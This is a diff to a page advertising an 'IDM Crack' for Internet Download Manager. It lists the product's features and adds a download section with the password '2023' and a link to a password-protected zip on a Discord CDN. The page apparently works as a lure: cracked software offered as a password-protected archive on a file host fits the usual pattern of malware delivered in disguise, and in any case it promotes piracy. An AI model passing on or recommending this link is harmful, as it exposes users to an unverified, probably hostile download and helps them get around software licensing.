@@ -23,7 +23,9 @@ IDM Crack with Internet Download Manager (IDM) is a tool to increase download sp
 
 IDM Crack with Internet Download Manager (IDM) supports proxy servers, FTP and HTTP protocols, firewalls, redirects, cookies, authorization, audio, and video content processing. IDM integrates seamlessly into Microsoft Internet Explorer, Netscape, MSN Explorer, AOL, Opera, Mozilla, Mozilla Firefox, Mozilla Firebird, Avant Browser, MyIE2, and all other popular browsers to handle your downloads automatically. You can also drag and drop files, or use Internet Download Manager from the command line. Internet Download Manager can dial your modem at the set time, download the files you want, then hang up or even shut down your computer when it’s done.
 
+# <a id="download-info"></a>[🗂 Download]
 
 | PASSWORD:  | 2023 |
 | ------------- | ------------- |
 | DOWNLOAD:  | [![Download Installer](https://custom-icon-badges.demolab.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download Installer")](https://cdn.discordapp.com/attachments/1149828424425283596/1149844051500212234/Password_2023.zip) |
+
